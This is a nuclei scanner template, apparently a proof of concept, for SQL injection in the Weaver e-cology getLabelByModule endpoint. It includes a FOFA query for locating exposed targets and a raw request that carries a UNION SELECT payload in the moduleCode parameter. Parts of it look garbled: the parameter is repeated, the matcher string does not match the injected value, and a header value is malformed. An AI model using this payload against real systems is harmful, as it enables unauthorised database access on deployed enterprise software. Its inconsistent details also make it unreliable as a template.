# Add your nuclei formatted PoC!
id: weaver-getLabelByModule-SQL
 
info:
  name: 泛微e-cology-SQL注入-getLabelByModule
  author: 蜜汁狗蛋
  severity: high
  metadata: 
    fofa-query: app="泛微-E-Weaver"
http:
  - raw:
      - |
        GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,12321'+-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        X-Requested-With: XMLHttpRequest
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9b
        Connection: close
 
 
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains(body,'1123123')
author: 蜜汁狗蛋
